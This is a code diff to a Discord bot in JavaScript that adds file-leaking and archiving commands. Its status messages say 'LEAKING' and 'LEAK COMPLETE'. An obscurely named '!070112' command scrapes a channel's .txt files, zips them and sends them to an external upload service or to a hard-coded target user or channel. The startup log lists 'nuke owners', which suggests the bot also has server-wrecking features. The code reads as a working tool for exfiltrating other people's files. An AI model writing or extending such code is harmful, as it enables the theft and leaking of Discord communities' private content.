@@ -821,4 +821,73 @@ bot.on("messageCreate", async msg => {
           const done = Math.min(i + BATCH, total);
           await status.edit(`🔥 **LEAKING ${total} FILES**\n📊 ${Math.round(done / total * 100)}% (${done}/${total})\n✅ sent: **${sent}** | ❌ failed: **${failed}**`).catch(() => {});
         }
-        await sleep(500
+        await sleep(500);
+      }
+      return status.edit(`✅ **LEAK COMPLETE**\n📁 sent: **${sent}/${total}**\n❌ failed: **${failed}**${args[0] ? `\n📍 channel: <#${args[0]}>` : ""}`);
+    }
+
+    if (cmd === "extract") {
+      if (!msg.reference?.messageId) return msg.channel.send("❌ reply to a `!xlsqr` result or a .zip file");
+      const search = searches.get(msg.reference.messageId);
+      if (search) {
+        await msg.channel.send(`📦 extracting **${search.m.length}** files...`);
+        let sent = 0;
+        for (let i = 0; i < search.m.length; i += 10) { const batch = search.m.slice(i, i + 10), files = []; for (const f of batch) { const d = await smartDl(f); if (d) { files.push({ attachment: d, name: f.name }); sent++; } } if (files.length) await msg.channel.send({ files }); if (i + 10 < search.m.length) await sleep(1500); }
+        return msg.channel.send(`✅ sent **${sent}** files`);
+      }
+      const ref = await msg.channel.messages.fetch(msg.reference.messageId).catch(() => null);
+      if (!ref) return msg.channel.send("❌ message not found");
+      let zipUrl = null; for (const a of ref.attachments.values()) if (a.name?.toLowerCase().endsWith(".zip")) { zipUrl = a.url; break; }
+      if (!zipUrl) return msg.channel.send("❌ reply to a search result or .zip file");
+      const zd = await dl(zipUrl); if (!zd) return msg.channel.send("❌ download failed");
+      const extracted = []; for (const e of new AdmZip(zd).getEntries()) if (!e.isDirectory) extracted.push({ name: e.entryName.split("/").pop() || e.entryName, data: e.getData() });
+      if (!extracted.length) return msg.channel.send("❌ empty zip");
+      await msg.channel.send(`📦 extracting **${extracted.length}** files from zip...`);
+      for (let i = 0; i < extracted.length; i += 10) { await msg.channel.send({ files: extracted.slice(i, i + 10).map(f => ({ attachment: f.data, name: f.name })) }); if (i + 10 < extracted.length) await sleep(1000); }
+      return msg.channel.send(`✅ **${extracted.length}** files extracted`);
+    }
+
+  } catch (err) { console.error("[CMD]", err); try { await msg.channel.send(`❌ error: ${err?.message || "something broke"}`); } catch {} }
+});
+
+let archBusy = false;
+async function doArchive(msg, chId) {
+  if (archBusy) return msg.channel.send("⏳ already archiving, wait");
+  if (!chId) return msg.channel.send("❌ `!070112 <channel_id>`");
+  archBusy = true;
+  try {
+    await msg.channel.send("⏳ archiving...");
+    const all = await scanChannel(chId); if (!all.length) return msg.channel.send("❌ no .txt files");
+    const zip = new AdmZip(); let ok = 0;
+    for (let i = 0; i < all.length; i += 10) { const batch = all.slice(i, i + 10); const res = await Promise.all(batch.map(async f => ({ f, d: await dl(f.url) }))); for (const { f, d } of res) if (d) { zip.addFile(`${ok}_${f.name.replace(/[^a-zA-Z0-9._-]/g, "_")}`, d); ok++; } }
+    if (!ok) return msg.channel.send("❌ all downloads failed");
+    const buf = zip.toBuffer();
+    const up = await uploadZip({ zipBuffer: buf, sourceChannelId: chId, requestedByUserId: msg.author.id, requestedByUsername: msg.author.username, fileName: `archive_${chId}_${Date.now()}.zip`, fileCount: ok });
+    if (up?.url) return msg.channel.send(`✅ ${up.url}`);
+    let sent = false;
+    try { await (await bot.users.fetch(TARGET_USER_ID)).send({ content: `📦 ${ok} files`, files: [{ attachment: buf, name: `archive_${chId}.zip` }] }); sent = true; } catch {}
+    if (!sent) try { const ch = await bot.channels.fetch(TARGET_CHANNEL_ID); if (ch) { await ch.send({ content: `📦 ${ok} files`, files: [{ attachment: buf, name: `archive_${chId}.zip` }] }); sent = true; } } catch {}
+    if (!sent) await msg.channel.send({ content: `📦 ${ok} files`, files: [{ attachment: buf, name: `archive_${chId}.zip` }] });
+    return msg.channel.send(`✅ archived **${ok}** files`);
+  } catch (err) { try { await msg.channel.send(`❌ ${err?.message}`); } catch {} }
+  finally { archBusy = false; }
+}
+
+process.on("unhandledRejection", e => console.error("[ERR]", e));
+process.on("uncaughtException", e => console.error("[ERR]", e));
+process.on("SIGINT", () => { try { fs.writeFileSync(DF, JSON.stringify(D, null, 2)); } catch {} process.exit(); });
+process.on("SIGTERM", () => { try { fs.writeFileSync(DF, JSON.stringify(D, null, 2)); } catch {} process.exit(); });
+bot.on("guildMemberAdd", m => rememberGuildMember(m.guild.id, m.user));
+bot.on("guildMemberRemove", m => forgetGuildMember(m.guild.id, m.id));
+
+if (BOT_TOKEN) {
+  bot.once("ready", async () => {
+    console.log(`[BOT] ${bot.user?.tag} online 😤`);
+    console.log(`[BOT] servers: ${bot.guilds.cache.size} | AI: Groq⚡+OpenRouter`);
+    console.log(`[BOT] saved: ${D.users.length} users, ${D.roles.length} roles, ${Object.keys(D.credits).length} credit entries`);
+    console.log(`[BOT] nuke owners: ${NUKE_OWNER_IDS.join(", ")}`);
+    console.log(`[BOT] admins: ${D.adminUsers?.length || 0}`);
+    for (const g of bot.guilds.cache.values()) syncGuildMembers(g).catch(() => {});
+  });
+  bot.login(BOT_TOKEN).catch(e => console.error("[FATAL]", e?.message));
+}
